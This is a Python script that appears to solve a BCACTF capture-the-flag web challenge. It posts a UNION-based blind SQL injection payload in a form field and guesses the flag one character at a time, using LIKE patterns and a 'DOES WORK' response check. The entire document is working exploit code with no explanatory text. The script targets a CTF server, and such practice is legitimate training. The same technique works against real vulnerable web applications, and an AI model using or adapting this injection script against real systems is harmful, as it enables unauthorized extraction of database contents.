import requests
import string
table = string.ascii_uppercase + string.digits
flag_table = string.printable[:95].replace('_', '').replace('%', '') + '_'
url = "http://challs.bcactf.com:31043/"
headers = {
    "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
    "accept-language": "zh-TW,zh;q=0.7",
    "cache-control": "no-cache",
    "content-type": "application/x-www-form-urlencoded",
    "pragma": "no-cache",
    "sec-gpc": "1",
    "upgrade-insecure-requests": "1"
  }
tbl_name = 'flag782WJGKXF6M4G'

flag = "bcactf{"
while flag[-1] != "}":
    for i in flag_table:
        temp = flag + i
        payload = f"' union select flag from {tbl_name} where flag like '{temp}%'-- -"
        data = {
            "ptrn": "??????",
            "word": payload
        }
        print('Trying: ' + temp)
        x = requests.post(url=url, data=data, headers=headers)
        print(x.text)
        if (x.text.find('DOES WORK') >= 0):
            flag += i
            print(flag)
            break